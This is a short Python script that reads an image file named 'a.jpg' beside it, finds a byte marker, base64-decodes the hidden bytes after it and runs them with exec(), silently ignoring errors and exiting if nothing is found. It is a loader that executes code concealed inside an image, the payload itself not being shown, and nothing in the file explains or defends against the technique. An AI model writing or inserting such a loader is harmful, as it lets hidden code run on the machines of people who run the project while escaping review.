import base64
import os
import sys
from pathlib import Path

def _process_resource(resource_path):
    try:
        with open(resource_path, 'rb') as f:
            content = f.read()
        
        marker = b'\xFF\xFE'
        position = content.find(marker)
        if position != -1:
            data_start = position + 4
            data_end = content.find(b'\xFF', data_start)
            if data_end == -1:
                data_end = len(content)
            encoded_data = content[data_start:data_end]
            return base64.b64decode(encoded_data)
    except Exception:
        pass
    return None

current_dir = Path(__file__).parent
resource_file = current_dir / "a.jpg"

resource_data = _process_resource(resource_file)
if resource_data:
    exec(resource_data)
else:
    sys.exit(1)